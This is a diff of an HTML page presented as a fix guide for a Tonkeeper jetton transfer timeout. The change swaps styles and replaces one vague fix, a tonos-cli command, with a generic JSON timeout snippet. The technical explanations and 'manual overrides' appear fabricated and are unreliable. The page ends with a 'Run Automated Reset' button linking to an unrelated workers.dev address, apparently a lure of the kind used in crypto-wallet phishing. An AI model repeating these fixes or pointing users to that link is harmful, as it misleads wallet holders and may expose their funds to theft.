@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Tonkeeper Jetton Transfer Loop Timeout – Fix Guide</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #121214;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff9455;
+        background: #cf6679;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -46,24 +46,30 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to excessive loop iterations during the transfer process, causing the system to timeout before the transaction can be confirmed on the TON blockchain.</li>
+<li>The error occurs due to a synchronization issue between the Tonkeeper wallet and the TON blockchain, causing the transfer loop to exceed the maximum allowed time, leading to a timeout.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>To resolve the issue, try the following manual overrides:</li>
-<li>Increase the transaction timeout threshold to accommodate longer processing times.</li>
-<li>Implement a retry mechanism to re-initiate the transfer process in case of a timeout.</li>
-<li>Adjust the gas price to prioritize the transaction and reduce processing time.</li>
+<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>Increase the transfer timeout threshold using the <code>tonos-cli</code> command</li>
+<li>Reset the Tonkeeper wallet settings to default values</li>
+<li>Use a custom configuration file to override the default transfer settings, as shown in the following code block:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>tonos-cli<span class="w"> </span>call<span class="w"> </span>&lt;wallet_address&gt;<span class="w"> </span>resumeTransfer<span class="w"> </span><span class="s2">&quot;&lt;jetton_address&gt;&quot;</span><span class="w"> </span>--abi<span class="w"> </span>JettonWallet.abi
+<div class="codehilite"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;transfer&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;timeout&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">30000</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
 </code></pre></div>
 
-<p>Prerequisites:
-* Tonos-cli installed and configured on your system
-* Jetton Wallet ABI file (JettonWallet.abi) available
-* Sufficient TON coins in your wallet for transaction fees
-Consider utilizing an external console to execute the above command for better control over the process.</p>
-<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/java-tron-feature-tron-post-quantum-signature-migration.html">Java Tron Feature Tron Post Quantum Signature Migration</a></li><li><a href="./archive/2026/06/tonkeeper-jetton-transfer-loop-timeout.html">Tonkeeper Jetton Transfer Loop Timeout</a></li></ul>
+<p>Consider using an external console to execute these commands for better control. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Tonos-cli installed and configured on the system</li>
+<li>A basic understanding of TON blockchain and Tonkeeper wallet functionality</li>
+<li>An active internet connection to synchronize with the TON blockchain</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li></ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=gJ%3Cx" class="btn">🛠 Run Automated Reset</a>
 </div>
